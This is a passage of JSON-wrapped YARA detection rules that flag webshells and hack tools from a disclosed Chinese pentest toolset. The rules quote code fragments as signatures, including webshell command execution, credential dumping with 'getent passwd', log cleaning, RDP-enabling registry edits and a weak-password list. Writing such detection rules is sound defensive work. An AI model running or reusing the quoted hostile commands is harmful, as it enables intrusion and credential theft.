14:15:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1014, T1087, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"set ss=zsckm.get(\\\"Win32_ProcessSta\\\"&uyy&\\\"rtup\\\")\" fullword ascii\n      $s1 = \"If jzgm=\\\"\\\"Then jzgm=\\\"cmd.exe /c net user\\\"\" fullword ascii\n   condition: \n      filesize < 80KB and all of them\n}","date":"2015-06-23 14:15:01","description":"Webshell from CN Honker Pentest Toolset - file rootkit.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_ASP_rootkit_RID32AB","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"03d5f36cbbff2392cbc2c08a929403ab","score":70,"tags":["T1100","DEMO","WEBSHELL","T1014","T1087"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_jspshell_RID31C1 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file jspshell.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:36:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"else if(Z.equals(\\\"M\\\")){String[] c={z1.substring(2),z1.substring(0,2),z2};Proce\" ascii\n      $s2 = \"String Z=EC(request.getParameter(Pwd)+\\\"\\\",cs);String z1=EC(request.getParameter\" ascii\n   condition: \n      filesize < 30KB and all of them\n}","date":"2015-06-23 13:36:01","description":"Webshell from CN Honker Pentest Toolset - file jspshell.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_jspshell_RID31C1","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"6665eb5948075be73ca4ebbef2aa162b","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_Serv_U_serv_u_RID33A3 : DEMO T1085 T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file serv-u.php\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:56:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1085, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"@readfile(\\\"c:\\\\\\\\winnt\\\\\\\\system32\\\\\" fullword ascii\n      $s2 = \"$sendbuf = \\\"PASS \\\".$_POST[\\\"password\\\"].\\\"\\\\r\\\\n\\\";\" fullword ascii\n      $s3 = \"$cmd=\\\"cmd /c rundll32.exe $path,install $openPort $activeStr\\\";\" fullword ascii\n   condition: \n      filesize < 435KB and all of them\n}","date":"2015-06-23 14:56:21","description":"Webshell from CN Honker Pentest Toolset - file serv-u.php","minimum_yara":"1.7","name":"CN_Honker_Webshell_Serv_U_serv_u_RID33A3","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"40eb8b08a07ab052832df9ce42a9392a","score":70,"tags":["T1100","T1085","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_WebShell_RID3172 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file WebShell.cgi\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:22:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$login = crypt($WebShell::Configuration::password, $salt);\" fullword ascii\n      $s2 = \"my $error = \\\"This command is not available in the restricted mode.\\\\n\\\";\" fullword ascii\n      $s3 = \"warn \\\"command: '$command'\\\\n\\\";\" fullword ascii\n   condition: \n      filesize < 30KB and 2 of them\n}","date":"2015-06-23 13:22:51","description":"Webshell from CN Honker Pentest Toolset - file WebShell.cgi","minimum_yara":"1.7","name":"CN_Honker_Webshell_WebShell_RID3172","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"ec3eebd747fec5497c6eb49b8edfe7ba","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_Tuoku_script_mssql_2_RID3688 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file mssql.asp\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 16:59:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"sqlpass=request(\\\"sqlpass\\\")\" fullword ascii\n      $s2 = \"set file=fso.createtextfile(server.mappath(request(\\\"filename\\\")),8,true)\" fullword ascii\n      $s3 = \"<blockquote> ServerIP:&nbsp;&nbsp;&nbsp;\" fullword ascii\n   condition: \n      filesize < 3KB and all of them\n}","date":"2015-06-23 16:59:51","description":"Webshell from CN Honker Pentest Toolset - file mssql.asp","minimum_yara":"1.7","name":"CN_Honker_Webshell_Tuoku_script_mssql_2_RID3688","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"86937beb9172026e1c5ba1ae4953f420","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_ASP_asp1_RID3114 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file asp1.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:07:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"SItEuRl=\" ascii\n      $s2 = \"<%@ LANGUAGE = VBScript.Encode %><%\" fullword ascii\n      $s3 = \"Server.ScriptTimeout=\" ascii\n   condition: \n      filesize < 200KB and all of them\n}","date":"2015-06-23 13:07:11","description":"Webshell from CN Honker Pentest Toolset - file asp1.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_ASP_asp1_RID3114","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"38b0f54720a2459d021fa259c36820c3","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_mempodipper2_6_RID3030 : DEMO HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file mempodipper2.6.39\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:29:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"objdump -d /bin/su|grep '<exit@plt>'|head -n 1|cut -d ' ' -f 1|sed\" ascii\n   condition: \n      filesize < 30KB and all of them\n}","date":"2015-06-23 12:29:11","description":"Sample from CN Honker Pentest Toolset - file mempodipper2.6.39","minimum_yara":"1.7","name":"CN_Honker_mempodipper2_6_RID3030","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"8f8e9b9100ead0a07ad0767b341a1fec","score":70,"tags":["DEMO","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_smsniff_smsniff_RID3112 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file smsniff.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:06:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"smsniff.exe\" fullword wide\n      $s5 = \"SmartSniff\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 267KB and all of them\n}","date":"2015-06-23 13:06:51","description":"Sample from CN Honker Pentest Toolset - file smsniff.exe","minimum_yara":"1.7","name":"CN_Honker_smsniff_smsniff_RID3112","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"b10d74ff4efd20167e6450b88d979972","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_LogCleaner_RID2EA3 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file LogCleaner.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:23:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \".exe <ip> [(path]\" fullword ascii\n      $s4 = \"LogCleaner v\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 250KB and all of them\n}","date":"2015-06-23 11:23:01","description":"Sample from CN Honker Pentest Toolset - file LogCleaner.exe","minimum_yara":"1.7","name":"CN_Honker_LogCleaner_RID2EA3","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"5447c248ca996e84b711084586b8b5e0","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Arp_EMP_v1_0_RID2EC0 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Arp EMP v1.0.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:27:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Arp EMP v1.0.exe\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}","date":"2015-06-23 11:27:51","description":"Sample from CN Honker Pentest Toolset - file Arp EMP v1.0.exe","minimum_yara":"1.7","name":"CN_Honker_Arp_EMP_v1_0_RID2EC0","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"ce29d74ae10b5e690dab5d8f0fb824ed","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_WebScan_WebScan_RID306C : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file WebScan.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:39:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"wwwscan.exe\" fullword wide\n      $s2 = \"WWWScan Gui\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and all of them\n}","date":"2015-06-23 12:39:11","description":"Sample from CN Honker Pentest Toolset - file WebScan.exe","minimum_yara":"1.7","name":"CN_Honker_WebScan_WebScan_RID306C","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"9dd00450569944d5e114999eeea76c12","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Tuoku_script_oracle_2_RID3339 : DEMO HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file oracle.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:38:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"webshell\" fullword ascii\n      $s1 = \"Silic Group Hacker Army \" fullword ascii\n   condition: \n      filesize < 3KB and all of them\n}","date":"2015-06-23 14:38:41","description":"Sample from CN Honker Pentest Toolset - file oracle.txt","minimum_yara":"1.7","name":"CN_Honker_Tuoku_script_oracle_2_RID3339","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"65b6e9adc57175ed265261248c316103","score":70,"tags":["DEMO","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_CleanIISLog_RID2EB1 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file CleanIISLog.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:25:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Usage: CleanIISLog <LogFile>|<.> <CleanIP>|<.>\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}","date":"2015-06-23 11:25:21","description":"Sample from CN Honker Pentest Toolset - file CleanIISLog.exe","minimum_yara":"1.7","name":"CN_Honker_CleanIISLog_RID2EB1","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"63cfc341fc4697b6acf796a4f509f791","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_SAMInside_RID2E04 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file SAMInside.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:56:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"www.InsidePro.com\" fullword wide\n      $s1 = \"SAMInside.exe\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 650KB and all of them\n}","date":"2015-06-23 10:56:31","description":"Sample from CN Honker Pentest Toolset - file SAMInside.exe","minimum_yara":"1.7","name":"CN_Honker_SAMInside_RID2E04","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"cdf45a0f8a7430fb6a83376a00824459","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_ms10048_x86_RID2DE9 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file ms10048-x86.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:52:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[+] Set to %d exploit half succeeded\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of them\n}","date":"2015-06-23 10:52:01","description":"Sample from CN Honker Pentest Toolset - file ms10048-x86.exe","minimum_yara":"1.7","name":"CN_Honker_ms10048_x86_RID2DE9","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"fdadccb72ff3c5195f480d6fec02f837","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_mafix_root_RID2EFF : DEMO SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file root\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:38:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"echo \\\"# vbox (voice box) getty\\\" >> /tmp/.init1\" fullword ascii\n      $s1 = \"cp /var/log/tcp.log $HOMEDIR/.owned/bex2/snifflog\" fullword ascii\n      $s2 = \"if [ -f /sbin/xlogin ]; then\" fullword ascii\n   condition: \n      filesize < 96KB and all of them\n}","date":"2015-06-23 11:38:21","description":"Script from disclosed CN Honker Pentest Toolset - file root","minimum_yara":"1.7","name":"CN_Honker_mafix_root_RID2EFF","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"d2a64ee4d8881f70988ee2c22bb51bb5","score":70,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule CN_Honker_passwd_dict_3389_RID3092 : DEMO SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file 3389.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:45:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"654321\" fullword ascii\n      $s1 = \"admin123\" fullword ascii\n      $s2 = \"admin123456\" fullword ascii\n      $s3 = \"administrator\" fullword ascii\n      $s4 = \"passwd\" fullword ascii\n      $s5 = \"password\" fullword ascii\n      $s7 = \"12345678\" fullword ascii\n   condition: \n      filesize < 1KB and all of them\n}","date":"2015-06-23 12:45:31","description":"Script from disclosed CN Honker Pentest Toolset - file 3389.txt","minimum_yara":"1.7","name":"CN_Honker_passwd_dict_3389_RID3092","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"cd476a35630f7d29f4fa0a5b7378ba40","score":70,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule CN_Honker_Perl_serv_U_RID2F2D : DEMO SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file Perl-serv-U.pl\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:46:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$dir = 'C:\\\\\\\\WINNT\\\\\\\\System32\\\\\\\\';\" fullword ascii\n      $s2 = \"$sock = IO::Socket::INET->new(\\\"127.0.0.1:$adminport\\\") || die \\\"fail\\\";\" fullword ascii\n   condition: \n      filesize < 8KB and all of them\n}","date":"2015-06-23 11:46:01","description":"Script from disclosed CN Honker Pentest Toolset - file Perl-serv-U.pl","minimum_yara":"1.7","name":"CN_Honker_Perl_serv_U_RID2F2D","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"717ab117c0d613876c524d2a5095ebcd","score":70,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule CN_Honker_F4ck_Team_f4ck_RID2FBC : DEMO SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file f4ck.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:09:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"PassWord:F4ckTeam!@#\" fullword ascii\n      $s1 = \"UserName:F4ck\" fullword ascii\n      $s2 = \"F4ck Team\" fullword ascii\n   condition: \n      filesize < 1KB and all of them\n}","date":"2015-06-23 12:09:51","description":"Script from disclosed CN Honker Pentest Toolset - file f4ck.txt","minimum_yara":"1.7","name":"CN_Honker_F4ck_Team_f4ck_RID2FBC","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"116fbc118986d06d05c04007a1d0c2a7","score":70,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule CN_Honker_Injection_Transit_jmCook_RID3470 : DEMO SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file jmCook.asp\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:30:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".Open \\\"POST\\\",PostUrl,False\" fullword ascii\n      $s2 = \"JmdcwName=request(\\\"jmdcw\\\")\" fullword ascii\n   condition: \n      filesize < 9KB and all of them\n}","date":"2015-06-23 15:30:31","description":"Script from disclosed CN Honker Pentest Toolset - file jmCook.asp","minimum_yara":"1.7","name":"CN_Honker_Injection_Transit_jmCook_RID3470","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"5873bdba9841ca92c9c737d8a4698c1b","score":70,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule CN_Honker_portRecall_pr_RID3020 : DEMO SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file pr\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:26:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Usage: Same as lcx.exe in win32 :)\" fullword ascii\n      $s2 = \"connect to client\" fullword ascii\n      $s3 = \"PR(Packet redirection) for linux \" fullword ascii\n   condition: \n      filesize < 70KB and all of them\n}","date":"2015-06-23 12:26:31","description":"Script from disclosed CN Honker Pentest Toolset - file pr","minimum_yara":"1.7","name":"CN_Honker_portRecall_pr_RID3020","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"f275a63ce0042fa2a25a643f57985217","score":70,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule CN_Honker_sig_3389_3389_3_RID2F08 : DEMO SUSP T1050 {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file 3389.bat\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:39:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP, T1050\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"echo \\\"fDenyTSConnections\\\"=dword:00000000>>3389.reg \" fullword ascii\n      $s2 = \"echo \\\"PortNumber\\\"=dword:00000d3d>>3389.reg \" fullword ascii\n      $s3 = \"echo [HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server]>>\" ascii\n   condition: \n      filesize < 2KB and all of them\n}","date":"2015-06-23 11:39:51","description":"Script from disclosed CN Honker Pentest Toolset - file 3389.bat","minimum_yara":"1.7","name":"CN_Honker_sig_3389_3389_3_RID2F08","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"3442dd1d18df5f878605345ac7ae6f03","score":70,"tags":["SUSP","DEMO","T1050"]},{"author":"Florian Roth","content":"rule CN_Honker_Alien_D_RID2D53 : DEMO SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file D.ASP\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:27:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Paths_str=\\\"c:\\\\windows\\\\\\\"&chr(13)&chr(10)&\\\"c:\\\\Documents and Settings\\\\\\\"&chr\" ascii\n      $s1 = \"CONST_FSO=\\\"Script\\\"&\\\"ing.Fil\\\"&\\\"eSyst\\\"&\\\"emObject\\\"\" fullword ascii\n      $s2 = \"Response.Write \\\"<form id='form1' name='form1' method='post' action=''>\\\"\" fullword ascii\n      $s3 = \"set getAtt=FSO.GetFile(filepath)\" fullword ascii\n      $s4 = \"Response.Write \\\"<input name='NoCheckTemp' type='checkbox' id='NoCheckTemp' chec\" ascii\n   condition: \n      filesize < 30KB and 2 of them\n}","date":"2015-06-23 10:27:01","description":"Script from disclosed CN Honker Pentest Toolset - file D.ASP","minimum_yara":"1.7","name":"CN_Honker_Alien_D_RID2D53","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"7c5ecfd00ad39dcfa31acd54230ada7e","score":70,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule CN_Honker_ChinaChopper_db_RID30A0 : DEMO SUSP T1100 {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file db.mdb\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:47:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP, T1100\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"http://www.maicaidao.com/server.phpcaidao\" fullword wide\n      $s2 = \"<O>act=login</O>\" fullword wide\n      $s3 = \"<H>localhost</H>\" fullword wide\n   condition: \n      filesize < 340KB and 2 of them\n}","date":"2015-06-23 12:47:51","description":"Script from disclosed CN Honker Pentest Toolset - file db.mdb","minimum_yara":"1.7","name":"CN_Honker_ChinaChopper_db_RID30A0","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"6917ae4530eb350a4906a19520e7847a","score":70,"tags":["SUSP","DEMO","T1100"]},{"author":"Florian Roth","content":"rule CN_Honker_linux_bin_RID2E8F : DEMO SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file linux_bin\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:19:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"client.sin_port = htons(atoi(argv[3]));\" fullword ascii\n      $s2 = \"printf(\\\"\\\\n\\\\n*********Waiting Client connect*****\\\\n\\\\n\\\");\" fullword ascii\n   condition: \n      filesize < 20KB and all of them\n}","date":"2015-06-23 11:19:41","description":"Script from disclosed CN Honker Pentest Toolset - file linux_bin","minimum_yara":"1.7","name":"CN_Honker_linux_bin_RID2E8F","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"92fc599b5df44958c8aad0e00c29ce89","score":70,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule CN_Honker_Intersect2_Beta_RID3085 : DEMO FILE SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file Intersect2-Beta.py\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:43:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"os.system(\\\"ls -alhR /home > AllUsers.txt\\\")\" fullword ascii\n      $s2 = \"os.system('getent passwd > passwd.txt')\" fullword ascii\n      $s3 = \"os.system(\\\"rm -rf credentials/\\\")\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x2123 and filesize < 50KB and 2 of them\n}","date":"2015-06-23 12:43:21","description":"Script from disclosed CN Honker Pentest Toolset - file Intersect2-Beta.py","minimum_yara":"1.7","name":"CN_Honker_Intersect2_Beta_RID3085","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"e6cbd448e86b77de2092cda606e7b7fb","score":70,"tags":["SUSP","DEMO","FILE"]},{"author":"Florian Roth","content":"rule CN_Honker_IIS_logcleaner1_0_readme_RID33B4 : DEMO SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file readme.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:59:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      